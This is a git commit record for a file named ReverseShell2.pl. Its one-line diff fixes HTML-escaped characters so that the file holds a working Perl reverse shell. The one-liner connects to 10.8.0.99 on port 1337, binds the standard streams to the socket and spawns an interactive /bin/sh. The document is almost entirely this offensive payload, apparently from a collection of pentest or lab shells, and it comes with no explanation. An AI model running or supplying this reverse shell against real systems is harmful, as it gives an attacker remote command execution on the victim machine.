36968d1c8c699a5579aa495870120a93f4b9cf63
Sho07 <113521577+Sho2007@users.noreply.github.com>
2025-04-03 17:15:45 +0700

    Update ReverseShell2.pl

--- ReverseShell2.pl
+++ ReverseShell2.pl
@@ -1,1 +1,1 @@
-perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="10.8.0.99";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
